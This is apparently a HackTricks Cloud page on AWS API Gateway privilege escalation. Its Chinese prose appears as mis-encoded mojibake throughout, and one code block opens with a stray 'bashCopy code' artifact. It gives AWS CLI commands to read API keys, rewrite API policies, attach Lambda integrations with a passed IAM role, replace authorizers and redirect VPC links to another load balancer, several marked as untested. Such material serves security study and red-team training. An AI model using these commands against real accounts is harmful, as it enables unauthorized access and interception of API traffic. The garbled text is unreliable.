# AWS - Apigateway Privesc

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Apigateway

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### `apigateway:POST`

æ‹¥æœ‰æ­¤æƒé™åï¼Œæ‚¨å¯ä»¥ç”Ÿæˆå·²é…ç½®çš„ API çš„ API å¯†é’¥ï¼ˆæŒ‰åŒºåŸŸï¼‰ã€‚
```bash
aws --region <region> apigateway create-api-key
```
**æ½œåœ¨å½±å“ï¼š** ä½ æ— æ³•é€šè¿‡è¿™ç§æŠ€æœ¯è¿›è¡Œæƒé™æå‡ï¼Œä½†ä½ å¯èƒ½ä¼šè·å¾—æ•æ„Ÿä¿¡æ¯çš„è®¿é—®æƒé™ã€‚

### `apigateway:GET`

é€šè¿‡æ­¤æƒé™ï¼Œä½ å¯ä»¥è·å–é…ç½®çš„ API çš„ç”Ÿæˆ API å¯†é’¥ï¼ˆæŒ‰åŒºåŸŸï¼‰ã€‚
```bash
aws --region <region> apigateway get-api-keys
aws --region <region> apigateway get-api-key --api-key <key> --include-value
```
**æ½œåœ¨å½±å“ï¼š** ä½ æ— æ³•é€šè¿‡è¿™ç§æŠ€æœ¯è¿›è¡Œæƒé™æå‡ï¼Œä½†ä½ å¯èƒ½ä¼šè·å¾—æ•æ„Ÿä¿¡æ¯çš„è®¿é—®æƒé™ã€‚

### `apigateway:UpdateRestApiPolicy`, `apigateway:PATCH`

æ‹¥æœ‰è¿™äº›æƒé™åï¼Œå¯ä»¥ä¿®æ”¹APIçš„èµ„æºç­–ç•¥ï¼Œä»¥ä¾¿ä¸ºè‡ªå·±æä¾›è°ƒç”¨å®ƒçš„æƒé™ï¼Œå¹¶æ»¥ç”¨APIç½‘å…³å¯èƒ½å…·æœ‰çš„æ½œåœ¨è®¿é—®æƒé™ï¼ˆä¾‹å¦‚è°ƒç”¨ä¸€ä¸ªè„†å¼±çš„lambdaï¼‰ã€‚

{% code overflow="wrap" %}
```bash
aws apigateway update-rest-api \
--rest-api-id api-id \
--patch-operations op=replace,path=/policy,value='"{\"jsonEscapedPolicyDocument\"}"'
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** é€šå¸¸æƒ…å†µä¸‹ï¼Œæ‚¨æ— æ³•ç›´æ¥é€šè¿‡æ­¤æŠ€æœ¯è¿›è¡Œæƒé™æå‡ï¼Œä½†æ‚¨å¯èƒ½ä¼šè·å¾—æ•æ„Ÿä¿¡æ¯çš„è®¿é—®æƒé™ã€‚

### `apigateway:PutIntegration`, `apigateway:CreateDeployment`, `iam:PassRole`

{% hint style="info" %}
éœ€è¦æµ‹è¯•
{% endhint %}

å…·æœ‰ `apigateway:PutIntegration`ã€`apigateway:CreateDeployment` å’Œ `iam:PassRole` æƒé™çš„æ”»å‡»è€…å¯ä»¥ **å‘ç°æœ‰çš„ API Gateway REST API æ·»åŠ ä¸€ä¸ªå¸¦æœ‰é™„åŠ  IAM è§’è‰²çš„ Lambda å‡½æ•°çš„æ–°é›†æˆ**ã€‚æ”»å‡»è€…å¯ä»¥ **è§¦å‘ Lambda å‡½æ•°ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œå¹¶å¯èƒ½è·å¾—ä¸ IAM è§’è‰²ç›¸å…³è”çš„èµ„æºçš„è®¿é—®æƒé™**ã€‚

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"
LAMBDA_ROLE_ARN="arn:aws:iam::account-id:role/lambda-role"

# Add a new integration to the API Gateway REST API
aws apigateway put-integration --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --type AWS_PROXY --integration-http-method POST --uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations --credentials $LAMBDA_ROLE_ARN

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**æ½œåœ¨å½±å“**ï¼šè®¿é—®ä¸ Lambda å‡½æ•°çš„ IAM è§’è‰²ç›¸å…³çš„èµ„æºã€‚

### `apigateway:UpdateAuthorizer`, `apigateway:CreateDeployment`

{% hint style="info" %}
éœ€è¦æµ‹è¯•
{% endhint %}

æ‹¥æœ‰ `apigateway:UpdateAuthorizer` å’Œ `apigateway:CreateDeployment` æƒé™çš„æ”»å‡»è€…å¯ä»¥**ä¿®æ”¹ç°æœ‰çš„ API Gateway æˆæƒè€…**ä»¥ç»•è¿‡å®‰å…¨æ£€æŸ¥æˆ–åœ¨è¿›è¡Œ API è¯·æ±‚æ—¶æ‰§è¡Œä»»æ„ä»£ç ã€‚

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
AUTHORIZER_ID="your-authorizer-id"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"

# Update the API Gateway authorizer
aws apigateway update-authorizer --rest-api-id $API_ID --authorizer-id $AUTHORIZER_ID --authorizer-uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**æ½œåœ¨å½±å“**ï¼šç»•è¿‡å®‰å…¨æ£€æŸ¥ï¼Œæœªç»æˆæƒè®¿é—®APIèµ„æºã€‚

### `apigateway:UpdateVpcLink`

{% hint style="info" %}
éœ€è¦æµ‹è¯•
{% endhint %}

æ‹¥æœ‰æƒé™ `apigateway:UpdateVpcLink` çš„æ”»å‡»è€…å¯ä»¥**ä¿®æ”¹ç°æœ‰çš„VPCé“¾æ¥ï¼Œä½¿å…¶æŒ‡å‘ä¸åŒçš„ç½‘ç»œè´Ÿè½½å‡è¡¡å™¨ï¼Œå¯èƒ½å°†ç§æœ‰APIæµé‡é‡å®šå‘åˆ°æœªç»æˆæƒæˆ–æ¶æ„çš„èµ„æº**ã€‚
```bash
bashCopy codeVPC_LINK_ID="your-vpc-link-id"
NEW_NLB_ARN="arn:aws:elasticloadbalancing:region:account-id:loadbalancer/net/new-load-balancer-name/50dc6c495c0c9188"

# Update the VPC Link
aws apigateway update-vpc-link --vpc-link-id $VPC_LINK_ID --patch-operations op=replace,path=/targetArns,value="[$NEW_NLB_ARN]"
```
**æ½œåœ¨å½±å“**ï¼šæœªç»æˆæƒè®¿é—®ç§æœ‰APIèµ„æºï¼Œæ‹¦æˆªæˆ–å¹²æ‰°APIæµé‡ã€‚

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**Telegramç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘ä»¬åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
